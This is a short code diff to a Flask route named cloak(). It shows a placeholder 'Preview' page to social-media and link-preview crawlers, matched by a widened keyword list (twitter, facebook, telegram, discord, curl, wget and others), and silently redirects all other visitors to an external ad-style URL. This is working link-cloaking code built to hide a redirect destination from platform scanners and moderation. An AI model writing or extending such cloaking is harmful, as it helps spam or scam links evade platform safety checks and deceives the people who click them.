@@ -10,9 +10,17 @@ def home():
 def cloak():
     ua = request.headers.get('User-Agent', '').lower()
 
-    if 'twitterbot' in ua or 'bot' in ua:
-        return render_template_string('''
-<!DOCTYPE html>
+    # Broad bot detection for social media previews
+    bot_keywords = [
+        'bot', 'twitter', 'facebook', 'telegram', 
+        'whatsapp', 'discord', 'crawler', 'spider', 
+        'meta', 'preview', 'curl', 'wget'
+    ]
+
+    is_bot = any(keyword in ua for keyword in bot_keywords)
+
+    if is_bot:
+        return render_template_string('''<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
@@ -32,8 +40,7 @@ def cloak():
 <body>
     <h1>Preview</h1>
 </body>
-</html>
-        ''')
+</html>''')
     else:
         return redirect("https://omg10.com/4/8480685", code=302)
 
